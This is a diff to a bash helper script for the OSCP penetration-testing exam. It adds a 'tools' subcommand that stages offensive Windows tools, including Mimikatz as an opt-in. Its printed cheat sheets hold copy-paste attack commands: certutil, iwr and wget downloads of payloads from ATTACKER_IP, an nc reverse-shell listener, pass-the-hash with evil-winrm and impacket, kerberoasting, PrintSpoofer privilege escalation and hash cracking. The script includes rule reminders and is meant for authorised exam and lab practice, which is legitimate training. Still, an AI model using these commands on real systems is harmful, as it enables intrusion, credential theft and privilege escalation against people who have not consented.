@@ -8,7 +8,7 @@
 set -euo pipefail
 umask 077
 
-TOOLKIT_VERSION="2026.05.27-buddy"
+TOOLKIT_VERSION="2026.05.30-tools"
 ROOT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
 SCANS_DIR="$ROOT_DIR/scans"
 DISC_DIR="$SCANS_DIR/discovery"
@@ -518,6 +518,7 @@ Workflow helpers:
   ./scripts/oscp.sh proof [local|proof]        # proof screenshot/checklist file
   ./scripts/oscp.sh stuck                      # anti-tunnel-vision checklist
   ./scripts/oscp.sh score                      # scoring tracker template
+  ./scripts/oscp.sh tools [status|stage|memory|snippets|commands|all]
   ./scripts/oscp.sh serve [PORT]               # HTTP server from transfer/
   ./scripts/oscp.sh listener <PORT>            # nc listener, rlwrap if present
   ./scripts/oscp.sh loot-search <TERM>
@@ -1476,6 +1477,421 @@ score_helper() {
   echo "$SCORING_FILE"
 }
 
+first_existing_file() {
+  local pattern match
+  for pattern in "$@"; do
+    if [[ -f "$pattern" ]]; then
+      printf '%s\n' "$pattern"
+      return 0
+    fi
+    while IFS= read -r match; do
+      [[ -f "$match" ]] || continue
+      printf '%s\n' "$match"
+      return 0
+    done < <(compgen -G "$pattern" 2>/dev/null || true)
+  done
+  return 1
+}
+
+print_cmd_status() {
+  local label="${1:?label required}"
+  shift
+
+  local cmd path
+  for cmd in "$@"; do
+    if path="$(command -v "$cmd" 2>/dev/null)"; then
+      printf ' [OK]   %-28s %s\n' "$label" "$path"
+      return 0
+    fi
+  done
+  printf ' [MISS] %-28s %s\n' "$label" "$*"
+  return 1
+}
+
+print_file_status() {
+  local label="${1:?label required}"
+  shift
+
+  local path
+  if path="$(first_existing_file "$@")"; then
+    printf ' [OK]   %-28s %s\n' "$label" "$path"
+    return 0
+  fi
+  printf ' [MISS] %-28s not found in common Kali paths\n' "$label"
+  return 1
+}
+
+stage_tool_file() {
+  local label="${1:?label required}"
+  local dest="${2:?dest required}"
+  shift 2
+
+  local stage_dir="$TRANSFER_DIR/tools"
+  local src out
+  mkdir -p "$stage_dir"
+
+  if ! src="$(first_existing_file "$@")"; then
+    warn "$label not found; skipping"
+    return 1
+  fi
+
+  out="$stage_dir/$dest"
+  if [[ "$src" == "$out" ]]; then
+    ok "$label already staged: $out"
+  else
+    cp -p "$src" "$out"
+    chmod 600 "$out" 2>/dev/null || true
+    ok "Staged $label -> $out"
+  fi
+  return 0
+}
+
+tools_status() {
+  cat <<EOF
+[POST-SHELL TOOL STATUS]
+
+Workspace:
+  $ROOT_DIR
+
+Transfer staging:
+  $TRANSFER_DIR/tools
+
+Local operator tools:
+EOF
+  print_cmd_status "BloodHound GUI" bloodhound bloodhound-ce || true
+  print_cmd_status "BloodHound Python" bloodhound-python || true
+  print_cmd_status "Neo4j" neo4j || true
+  print_cmd_status "evil-winrm" evil-winrm || true
+  print_cmd_status "NetExec / CrackMapExec" netexec crackmapexec || true
+  print_cmd_status "Impacket secretsdump" impacket-secretsdump secretsdump.py || true
+  print_cmd_status "Impacket GetUserSPNs" impacket-GetUserSPNs GetUserSPNs.py || true
+  print_cmd_status "Impacket GetNPUsers" impacket-GetNPUsers GetNPUsers.py || true
+  print_cmd_status "Responder" responder || true
+  print_cmd_status "Empire" powershell-empire empire-server empire || true
+  print_cmd_status "Covenant" covenant Covenant || true
+
+  echo
+  echo "Stageable Windows-side files:"
+  print_file_status "PowerView.ps1" \
+    /usr/share/windows-resources/powersploit/Recon/PowerView.ps1 \
+    /usr/share/powersploit/Recon/PowerView.ps1 \
+    /opt/PowerSploit/Recon/PowerView.ps1 \
+    /opt/PowerView*/PowerView.ps1 || true
+  print_file_status "SharpHound.exe" \
+    /usr/share/windows-resources/bloodhound/SharpHound.exe \
+    /usr/lib/bloodhound/resources/app/Collectors/SharpHound.exe \
+    /usr/share/bloodhound/Collectors/SharpHound.exe \
+    /opt/SharpHound*/SharpHound.exe || true
+  print_file_status "SharpHound.ps1" \
+    /usr/share/windows-resources/bloodhound/SharpHound.ps1 \
+    /usr/lib/bloodhound/resources/app/Collectors/SharpHound.ps1 \
+    /usr/share/bloodhound/Collectors/SharpHound.ps1 \
+    /opt/SharpHound*/SharpHound.ps1 || true
+  print_file_status "Rubeus.exe" \
+    /usr/share/windows-resources/rubeus/Rubeus.exe \
+    /usr/share/rubeus/Rubeus.exe \
+    /opt/Rubeus/Rubeus.exe \
+    /opt/Rubeus*/Rubeus.exe || true
+  print_file_status "PrintSpoofer.exe" \
+    /usr/share/windows-resources/PrintSpoofer/PrintSpoofer.exe \
+    /usr/share/windows-resources/PrintSpoofer.exe \
+    /opt/PrintSpoofer/PrintSpoofer.exe \
+    /opt/PrintSpoofer*/PrintSpoofer.exe || true
+  print_file_status "Mimikatz x64" \
+    /usr/share/windows-resources/mimikatz/x64/mimikatz.exe \
+    /usr/share/mimikatz/x64/mimikatz.exe \
+    /opt/mimikatz/x64/mimikatz.exe \
+    /opt/mimikatz*/x64/mimikatz.exe || true
+
+  cat <<'EOF'
+
+Rule reminders:
+  - Keep this as static local tooling. Do not use LLM/chatbot help during the live exam or report phase.
+  - Do not use Responder poisoning/spoofing where it is forbidden; treat it as restricted unless the live rules explicitly allow your exact use.
+  - Treat Empire/Covenant as restricted until you verify the live exam rules and your intended usage.
+EOF
+}
+
+tools_stage() {
+  local stage_dir="$TRANSFER_DIR/tools"
+  mkdir -p "$stage_dir"
+
+  cat > "$stage_dir/README.txt" <<'EOF'
+OSCP transfer staging
+
+This directory is for files already installed locally on your authorised exam/lab box.
+Serve it with: ./scripts/oscp.sh serve 8000
+
+Use only within your authorised scope and current exam rules.
+Responder poisoning/spoofing and C2-style workflows may be restricted.
+EOF
+
+  stage_tool_file "PowerView.ps1" "PowerView.ps1" \
+    /usr/share/windows-resources/powersploit/Recon/PowerView.ps1 \
+    /usr/share/powersploit/Recon/PowerView.ps1 \
+    /opt/PowerSploit/Recon/PowerView.ps1 \
+    /opt/PowerView*/PowerView.ps1 || true
+  stage_tool_file "SharpHound.exe" "SharpHound.exe" \
+    /usr/share/windows-resources/bloodhound/SharpHound.exe \
+    /usr/lib/bloodhound/resources/app/Collectors/SharpHound.exe \
+    /usr/share/bloodhound/Collectors/SharpHound.exe \
+    /opt/SharpHound*/SharpHound.exe || true
+  stage_tool_file "SharpHound.ps1" "SharpHound.ps1" \
+    /usr/share/windows-resources/bloodhound/SharpHound.ps1 \
+    /usr/lib/bloodhound/resources/app/Collectors/SharpHound.ps1 \
+    /usr/share/bloodhound/Collectors/SharpHound.ps1 \
+    /opt/SharpHound*/SharpHound.ps1 || true
+  stage_tool_file "Rubeus.exe" "Rubeus.exe" \
+    /usr/share/windows-resources/rubeus/Rubeus.exe \
+    /usr/share/rubeus/Rubeus.exe \
+    /opt/Rubeus/Rubeus.exe \
+    /opt/Rubeus*/Rubeus.exe || true
+  stage_tool_file "PrintSpoofer.exe" "PrintSpoofer.exe" \
+    /usr/share/windows-resources/PrintSpoofer/PrintSpoofer.exe \
+    /usr/share/windows-resources/PrintSpoofer.exe \
+    /opt/PrintSpoofer/PrintSpoofer.exe \
+    /opt/PrintSpoofer*/PrintSpoofer.exe || true
+
+  if [[ "${OSCP_STAGE_SENSITIVE:-0}" == "1" ]]; then
+    stage_tool_file "Mimikatz x64" "mimikatz.exe" \
+      /usr/share/windows-resources/mimikatz/x64/mimikatz.exe \
+      /usr/share/mimikatz/x64/mimikatz.exe \
+      /opt/mimikatz/x64/mimikatz.exe \
+      /opt/mimikatz*/x64/mimikatz.exe || true
+  else
+    warn "Mimikatz not staged by default. Set OSCP_STAGE_SENSITIVE=1 only if rules and scope permit."
+  fi
+
+  ok "Stage directory ready: $stage_dir"
+  echo
+  find "$stage_dir" -maxdepth 1 -type f -printf '  %f\n' | sort
+}
+
+tools_snippets() {
+  cat <<'EOF'
+[POST-SHELL COPY/PASTE SNIPPETS]
+
+1. Stage files and start the transfer server from your workspace:
+  ./scripts/oscp.sh tools stage
+  ./scripts/oscp.sh serve 8000
+
+2. Get your attacker VPN IP:
+  ip -4 addr show tun0
+  ip -4 addr show tap0
+
+3. Windows target: download staged files to disk, then run/import explicitly:
+  cd %TEMP%
+  certutil -urlcache -f http://ATTACKER_IP:8000/tools/PowerView.ps1 PowerView.ps1
+  certutil -urlcache -f http://ATTACKER_IP:8000/tools/SharpHound.exe SharpHound.exe
+  certutil -urlcache -f http://ATTACKER_IP:8000/tools/Rubeus.exe Rubeus.exe
+  certutil -urlcache -f http://ATTACKER_IP:8000/tools/PrintSpoofer.exe PrintSpoofer.exe
+
+4. Windows PowerShell target: download and import from disk:
+  powershell
+  iwr -UseBasicParsing http://ATTACKER_IP:8000/tools/PowerView.ps1 -OutFile $env:TEMP\PowerView.ps1
+  cd $env:TEMP
+  . .\PowerView.ps1
+
+5. Kali-side AD command reminders after valid creds:
+  ./scripts/oscp.sh ad TARGET_IP
+  evil-winrm -i TARGET_IP -u USER -p 'PASS'
+  netexec smb TARGET_IP -u USER -p 'PASS' --shares
+  impacket-GetUserSPNs DOMAIN/USER:'PASS' -dc-ip DC_IP -request -outputfile ad/kerberoast.txt
+  bloodhound-python -u USER -p 'PASS' -d DOMAIN -c All -ns DC_IP
+
+6. Mimikatz staging is intentionally opt-in:
+  OSCP_STAGE_SENSITIVE=1 ./scripts/oscp.sh tools stage
+
+Notes:
+  - These snippets avoid memory-only loaders. They stage files, fetch to disk, and leave command history/evidence easier to track.
+  - Do not run Responder poisoning/spoofing or C2 workflows unless the live rules explicitly permit your exact use.
+EOF
+}
+
+tools_memory() {
+  cat <<'EOF'
+[LOCAL MEMORY IMPORT GUIDE]
+
+Supported pattern:
+  Stage or upload files first, then import local PowerShell scripts into the current session.
+
+Not included:
+  Memory-only web download cradles, reflective PE loading, shellcode loaders, AMSI bypass, AV bypass,
+  or stealth execution patterns.
+
+PowerShell: load PowerView functions from a file already on disk:
+  powershell
+  cd $env:TEMP
+  . .\PowerView.ps1
+  Get-Command Get-Domain*
+
+PowerShell: same idea with an explicit path:
+  . C:\Windows\Temp\PowerView.ps1
+
+PowerShell: run a local collector from disk:
+  cd $env:TEMP
+  .\SharpHound.exe -c Default --zipfilename sh_default.zip
+
+PowerShell/cmd: executables are run from disk, not imported as functions:
+  .\Rubeus.exe
+  .\PrintSpoofer.exe
+  .\mimikatz.exe
+
+Evil-WinRM upload/import flow:
+  evil-winrm -i TARGET_IP -u USER -p 'PASS'
+  upload transfer/tools/PowerView.ps1
+  upload transfer/tools/SharpHound.exe
+  powershell
+  . .\PowerView.ps1
+
+Keep output recoverable:
+  dir
+  whoami /all > whoami_all.txt
+  .\SharpHound.exe -c Default --zipfilename sh_default.zip
+  download sh_default.zip
+EOF
+}
+
+tools_commands() {
+  cat <<'EOF'
+[OUTSIDE-SCRIPT COMMANDS]
+
+Session setup:
+  tmux new -s oscp
+  ip -br -4 addr
+  ip -4 addr show tun0
+  ./scripts/oscp.sh tools status
+  ./scripts/oscp.sh tools stage
+  ./scripts/oscp.sh serve 8000
+
+Windows transfer:
+  cd %TEMP%
+  certutil -urlcache -f http://ATTACKER_IP:8000/tools/PowerView.ps1 PowerView.ps1
+  certutil -urlcache -f http://ATTACKER_IP:8000/tools/SharpHound.exe SharpHound.exe
+  certutil -urlcache -f http://ATTACKER_IP:8000/tools/Rubeus.exe Rubeus.exe
+  certutil -urlcache -f http://ATTACKER_IP:8000/tools/PrintSpoofer.exe PrintSpoofer.exe
+
+PowerShell transfer:
+  iwr -UseBasicParsing http://ATTACKER_IP:8000/tools/PowerView.ps1 -OutFile $env:TEMP\PowerView.ps1
+  iwr -UseBasicParsing http://ATTACKER_IP:8000/tools/SharpHound.exe -OutFile $env:TEMP\SharpHound.exe
+  iwr -UseBasicParsing http://ATTACKER_IP:8000/tools/Rubeus.exe -OutFile $env:TEMP\Rubeus.exe
+
+Linux transfer from target:
+  cd /tmp
+  wget http://ATTACKER_IP:8000/FILENAME
+  curl -O http://ATTACKER_IP:8000/FILENAME
+  chmod +x FILENAME
+
+Shell quality:
+  python3 -c 'import pty; pty.spawn("/bin/bash")'
+  export TERM=xterm
+  stty rows 40 columns 120
+  rlwrap -cAr nc -lvnp 4444
+
+Windows first checks:
+  whoami /all
+  hostname
+  ipconfig /all
+  net user
+  net localgroup administrators
+  net user /domain
+  net group "Domain Admins" /domain
+  dir C:\Users
+
+Linux first checks:
+  id; whoami; hostname
+  ip a
+  sudo -l
+  find / -perm -4000 -ls 2>/dev/null
+  getcap -r / 2>/dev/null
+  ss -tulpen
+
+Evil-WinRM:
+  evil-winrm -i TARGET_IP -u USER -p 'PASS'
+  evil-winrm -i TARGET_IP -u USER -H NTLM_HASH
+  upload transfer/tools/PowerView.ps1
+  upload transfer/tools/SharpHound.exe
+  download C:\Windows\Temp\loot.zip
+
+NetExec / CrackMapExec:
+  netexec smb TARGET_IP -u USER -p 'PASS'
+  netexec smb TARGET_IP -u USER -p 'PASS' --shares
+  netexec smb TARGET_IP -u USER -p 'PASS' --users
+  netexec smb TARGET_IP -u USER -p 'PASS' --groups
+  netexec winrm TARGET_IP -u USER -p 'PASS'
+  crackmapexec smb TARGET_IP -u USER -p 'PASS' --shares
+
+Impacket:
+  impacket-GetNPUsers DOMAIN/ -usersfile users.txt -dc-ip DC_IP -format hashcat -outputfile ad/asrep.txt
+  impacket-GetUserSPNs DOMAIN/USER:'PASS' -dc-ip DC_IP -request -outputfile ad/kerberoast.txt
+  impacket-wmiexec DOMAIN/USER:'PASS'@TARGET_IP
+  impacket-wmiexec -hashes :NTLM_HASH DOMAIN/USER@TARGET_IP
+  impacket-psexec DOMAIN/USER:'PASS'@TARGET_IP
+  impacket-smbserver share transfer -smb2support
+
+BloodHound:
+  sudo neo4j console
+  bloodhound
+  bloodhound-python -u USER -p 'PASS' -d DOMAIN -c Default -ns DC_IP --zip
+  bloodhound-python -u USER -p 'PASS' -d DOMAIN -c All -ns DC_IP --zip
+  .\SharpHound.exe -c Default --zipfilename sh_default.zip
+  .\SharpHound.exe -c All --zipfilename sh_all.zip
+
+PowerView after local import:
+  . .\PowerView.ps1
+  Get-Domain
+  Get-DomainUser -SPN | select samaccountname,serviceprincipalname
+  Get-DomainGroupMember "Domain Admins"
+  Get-DomainComputer -Properties dnshostname,operatingsystem
+  Find-LocalAdminAccess -Verbose
+
+Rubeus after upload, if rules and scope permit:
+  .\Rubeus.exe kerberoast /outfile:kerberoast.txt
+  .\Rubeus.exe asreproast /outfile:asrep.txt
+
+PrintSpoofer after whoami /priv shows SeImpersonatePrivilege:
+  .\PrintSpoofer.exe -i -c cmd
+  .\PrintSpoofer.exe -c "cmd /c whoami > C:\Windows\Temp\ps.txt"
+
+Hash cracking:
+  hashcat -m 13100 ad/kerberoast.txt /usr/share/wordlists/rockyou.txt
+  hashcat -m 18200 ad/asrep.txt /usr/share/wordlists/rockyou.txt
+  hashcat -m 1000 loot/ntlm.txt /usr/share/wordlists/rockyou.txt
+  john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
+
+Responder:
+  Do not run poisoning/spoofing in the exam where forbidden. Use packet capture instead:
+  sudo tcpdump -i tun0 -nn
+
+Evidence:
+  ./scripts/oscp.sh note "what worked, source, next action"
+  ./scripts/oscp.sh add-cred smb USER 'PASS' 'source'
+  ./scripts/oscp.sh hash '<hash> (source/type)'
+  ./scripts/oscp.sh screenshot "proof shell with ip visible"
+EOF
+}
+
+tools_helper() {
+  local mode="${1:-all}"
+  case "$mode" in
+    status) tools_status ;;
+    stage) tools_stage ;;
+    memory) tools_memory ;;
+    snippets) tools_snippets ;;
+    commands|cmds|outside) tools_commands ;;
+    all)
+      tools_status
+      echo
+      tools_memory
+      echo
+      tools_snippets
+      echo
+      tools_commands
+      ;;
+    *) die "usage: tools [status|stage|memory|snippets|commands|all]" ;;
+  esac
+}
+
 quick() {
   local target
   target="$(target_or_default "${1:-}")"
@@ -1709,6 +2125,7 @@ case "$cmd" in
   proof) shift; proof_helper "${1:-local}" ;;
   stuck) shift; stuck_helper ;;
   score) shift; score_helper ;;
+  tools|post-shell|toolbox) shift; tools_helper "${1:-all}" ;;
   serve) shift; serve "${1:-8000}" ;;
   listener) shift; listener "${1:-}" ;;
   loot-search) shift; loot_search "$*" ;;
